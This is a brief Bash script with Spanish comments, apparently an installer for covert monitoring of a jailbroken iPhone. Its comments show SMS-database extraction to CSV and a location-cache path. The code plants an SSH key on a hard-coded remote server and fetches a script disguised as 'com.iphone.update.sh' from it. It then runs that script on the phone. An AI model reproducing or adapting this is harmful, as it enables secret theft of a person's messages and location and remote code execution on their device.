#Instalacion de script xra iPhone by X-Ed
#sqlite3 -csv -separator ',' 2010-08-31-sms.db "select ROWID, address, date, text, flags, group_id, UIFlags INTEGER from message;" > 2010-08-31-sms.csv
#echo 1283947010 | perl -e 'print localtime(<>) . "\n";'
#/private/var/root/Library/Caches/locationd/

ruser=edgar
rdomain=187.141.246.200
rport=2002
llave=/var/root/.ssh/id_rsa.pub
directory=/etc/scripts
rfile=com.iphone.update.sh
rdirectory=/home/$ruser/iPhone

if [ -f $llave ];
then
 #ssh -p $rport $ruser@$rdomain
 echo "Ya se ha generado anteriormente una llave publica RSA ($llave)"
else
 ssh-keygen -t rsa
 ssh -p $rport $ruser@$rdomain mkdir -p .ssh
 cat $llave | ssh -p $rport $ruser@$rdomain 'cat >> .ssh/authorized_keys'
fi
scp -P $rport $ruser@$rdomain:$rdirectory/$rfile $directory/
$directory/$rfile
